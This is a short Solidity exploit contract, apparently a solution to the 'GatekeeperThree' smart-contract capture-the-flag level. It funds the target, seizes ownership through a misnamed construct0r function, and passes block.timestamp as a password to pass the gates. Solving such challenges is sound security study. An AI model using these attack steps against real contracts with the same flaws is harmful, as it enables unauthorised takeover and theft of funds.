// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function getAllowance(uint _password) external;
    function createTrick() external;
    function enter() external;
    function allowEntrance() external returns (bool);
}

contract GatekeeperThreeHack {
    address payable public target;

    constructor(address _target) payable {
        target = payable(_target);
    }

    function hack() external {
        target.call{value: 0.0011 ether}("");
        IGatekeeperThree(target).construct0r();
        IGatekeeperThree(target).createTrick();
        IGatekeeperThree(target).getAllowance(block.timestamp);
        IGatekeeperThree(target).enter();
    }
}